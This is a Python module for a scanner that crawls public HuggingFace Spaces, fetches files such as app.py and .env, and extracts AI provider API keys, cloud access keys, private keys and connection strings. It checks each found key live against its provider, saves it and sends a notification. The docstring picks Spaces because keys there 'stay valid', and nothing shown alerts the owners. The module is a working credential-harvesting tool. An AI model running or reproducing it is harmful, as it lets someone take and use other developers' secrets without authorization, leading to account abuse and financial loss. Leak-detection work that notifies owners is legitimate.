"""
HuggingFace Spaces scanner — finds leaked AI API keys in public Spaces apps.

Why HuggingFace Spaces:
  - Gradio/Streamlit demos routinely hardcode API keys for quick prototyping
  - No GitHub Secret Scanning → keys stay valid
  - ~400k+ public Spaces, ~5k+ created/updated per day
  - High density of Cerebras, Together, Groq, OpenRouter, OpenAI keys
  - Most developers don't realize their Space source is public

Architecture:
  - Lists Spaces sorted by recently modified (catches fresh leaks) + trending
  - For each Space, fetches key files (app.py, .env, config.py, utils.py…)
  - Dedup via try_claim_file(sha256("hf:{space_id}:{filepath}"))
  - Single HF_TOKEN (read scope), rate limit ~1000 req/min

Rate limits (HuggingFace):
  - /api/spaces list: generous, no strict limit documented
  - File fetch: ~300-500 req/min with token
"""

import asyncio
import hashlib
import logging

import httpx

import db
from config import HF_TOKEN, HF_SCAN_INTERVAL
from patterns import EXTRACTORS, is_skippable_path
from infra_patterns import INFRA_EXTRACTORS, assess_risk, extract_destination
from validators import validate
from notifier import notify_found, notify_infra_found

log = logging.getLogger(__name__)

_BASE          = "https://huggingface.co"
_API_BASE      = "https://huggingface.co/api"
_SPACES_LIMIT  = 500    # spaces per list request
_FILE_TIMEOUT  = 10     # seconds per file fetch
_CONCURRENT    = 8      # parallel file fetches
_FILE_SIZE_MAX = 512_000  # skip files > 512KB (minified JS, model weights, etc.)

_LIMITS = httpx.Limits(
    max_connections=60,
    max_keepalive_connections=20,
    keepalive_expiry=30,
)

# Files to try in every Space (ordered by likelihood of containing keys)
_TARGET_FILES: list[str] = [
    "app.py",
    ".env",
    ".env.example",
    "main.py",
    "config.py",
    "settings.py",
    "utils.py",
    "helpers.py",
    "src/app.py",
    "src/main.py",
    "src/config.py",
    "api.py",
    "backend.py",
    "server.py",
    "app.ipynb",
    "notebook.ipynb",
    "demo.py",
    "inference.py",
    "model.py",
    "llm.py",
    "chatbot.py",
    "gradio_app.py",
]

_AI_TRIGGER = (
    "sk-", "AIzaSy", "eyJ",
    "hf_", "pplx-", "xai-", "r8_",
    "gsk_", "fw_", "sk-or-v1", "csk-",
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "TOGETHER_API_KEY",
    "GROQ_API_KEY", "CEREBRAS_API_KEY", "REPLICATE_API_TOKEN",
    "FIREWORKS_API_KEY", "MISTRAL_API_KEY", "COHERE_API_KEY",
    "os.environ", "getenv", "dotenv",
)
_INFRA_TRIGGER = (
    "://", "BEGIN PRIVATE KEY", "BEGIN RSA", "BEGIN OPENSSH",
    "AKIA", "AIPA", "AIDA", "AROA", "ASIA",
)


def _headers() -> dict:
    return {
        "Authorization": f"Bearer {HF_TOKEN}",
        "User-Agent": "Mozilla/5.0 (compatible; ghscan/1.0)",
    }


def _claim_key(space_id: str, filepath: str) -> str:
    return hashlib.sha256(f"hf:{space_id}:{filepath}".encode()).hexdigest()[:40]


async def _list_spaces(client: httpx.AsyncClient,
                       sort: str = "modified") -> list[dict]:
    """Fetch a page of public Spaces sorted by `sort`."""
    try:
        r = await client.get(
            f"{_API_BASE}/spaces",
            headers=_headers(),
            params={
                "limit":     _SPACES_LIMIT,
                "sort":      sort,
                "direction": -1,
                "full":      "false",
            },
            timeout=20,
        )
        if r.status_code in (401, 403):
            log.warning("[hf] token unauthorized (check HF_TOKEN scope)")
            return []
        if r.status_code != 200:
            log.debug("[hf] list status=%d sort=%s", r.status_code, sort)
            return []
        data = r.json()
        return data if isinstance(data, list) else []
    except Exception as e:
        log.debug("[hf] list err: %s", e)
        return []


async def _fetch_file(client: httpx.AsyncClient,
                      space_id: str, filepath: str) -> str | None:
    """Fetch raw file content from a HuggingFace Space."""
    owner, repo = (space_id.split("/", 1) + [""])[:2]
    if not owner or not repo:
        return None

    # HF raw file URL: /spaces/{owner}/{repo}/resolve/main/{filepath}
    url = f"{_BASE}/spaces/{owner}/{repo}/resolve/main/{filepath}"
    try:
        r = await client.get(
            url, headers=_headers(), timeout=_FILE_TIMEOUT, follow_redirects=True
        )
        if r.status_code == 404:
            return None
        if r.status_code in (401, 403):
            return None
        if r.status_code != 200:
            log.debug("[hf] file status=%d %s/%s", r.status_code, space_id, filepath)
            return None
        if len(r.content) > _FILE_SIZE_MAX:
            return None
        return r.text
    except Exception as e:
        log.debug("[hf] fetch err %s/%s: %s", space_id, filepath, e)
        return None


async def _scan_content(space_id: str, filepath: str, content: str):
    """Run extractors on Space file content."""
    has_ai    = any(t in content for t in _AI_TRIGGER)
    has_infra = any(t in content for t in _INFRA_TRIGGER)
    if not has_ai and not has_infra:
        return

    file_url   = f"{_BASE}/spaces/{space_id}/blob/main/{filepath}"
    repo_label = space_id

    if has_ai:
        for prov, fn in EXTRACTORS.items():
            for key in fn(content):
                if db.key_exists(key):
                    continue
                is_valid = await validate(prov, key)
                saved = db.save_key(
                    prov, key, repo_label, filepath, file_url,
                    0, "", "hf_spaces", is_valid,
                )
                if saved:
                    await notify_found(
                        prov, key, repo_label, filepath, file_url,
                        0, "", "hf_spaces", is_valid,
                    )
                    log.info("[hf %s] %s from %s/%s",
                             "VALID" if is_valid else "found", prov, space_id, filepath)

    if has_infra:
        risk_cache = None
        for iprov, ifn in INFRA_EXTRACTORS.items():
            creds = ifn(content)
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(content, filepath, 0, "")
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                db.save_infra(
                    iprov, cred, repo_label, filepath, file_url,
                    0, "", "hf_spaces", destination, risk_level, risk_reasons,
                )
                await notify_infra_found(
                    iprov, cred, repo_label, filepath, file_url,
                    0, "", "hf_spaces", destination, risk_level, risk_reasons,
                )


async def _scan_space(client: httpx.AsyncClient,
                      space: dict, sem: asyncio.Semaphore):
    """Fetch and scan all target files in a Space."""
    space_id = space.get("id", "")
    if not space_id or "/" not in space_id:
        return

    sdk = space.get("sdk", "")
    # Prioritize gradio/streamlit — docker/static less likely to have hardcoded keys
    # But don't skip docker — many docker Spaces have Python backends with keys

    async def fetch_one(filepath: str):
        if is_skippable_path(filepath):
            return
        ck = _claim_key(space_id, filepath)
        if not db.try_claim_file(ck):
            return
        async with sem:
            content = await _fetch_file(client, space_id, filepath)
        if content:
            await _scan_content(space_id, filepath, content)

    tasks = [asyncio.create_task(fetch_one(f)) for f in _TARGET_FILES]
    await asyncio.gather(*tasks, return_exceptions=True)


async def run_hf_cycle():
    if not HF_TOKEN:
        return

    log.info("=== hf_spaces cycle start ===")

    sem = asyncio.Semaphore(_CONCURRENT)

    async with httpx.AsyncClient(follow_redirects=False, limits=_LIMITS) as client:
        # Two passes: recently modified (fresh leaks) + trending (popular repos)
        all_spaces: list[dict] = []
        seen_ids: set[str] = set()

        for sort in ("modified", "trendingScore"):
            batch = await _list_spaces(client, sort=sort)
            for s in batch:
                sid = s.get("id", "")
                if sid and sid not in seen_ids:
                    seen_ids.add(sid)
                    all_spaces.append(s)

        log.info("[hf] %d unique spaces to scan", len(all_spaces))

        for space in all_spaces:
            try:
                await _scan_space(client, space, sem)
            except Exception as e:
                log.debug("[hf] space scan err %s: %s", space.get("id"), e)

    log.info("=== hf_spaces cycle done ===")


async def hf_loop():
    if not HF_TOKEN:
        log.info("hf_spaces: no HF_TOKEN configured — skipping")
        return

    log.info("hf_spaces scanner started | interval=%ds | %d files/space",
             HF_SCAN_INTERVAL, len(_TARGET_FILES))

    while True:
        try:
            await run_hf_cycle()
        except Exception as e:
            log.error("hf_spaces cycle crashed: %s", e)
        log.info("hf_spaces sleeping %ds until next cycle", HF_SCAN_INTERVAL)
        await asyncio.sleep(HF_SCAN_INTERVAL)
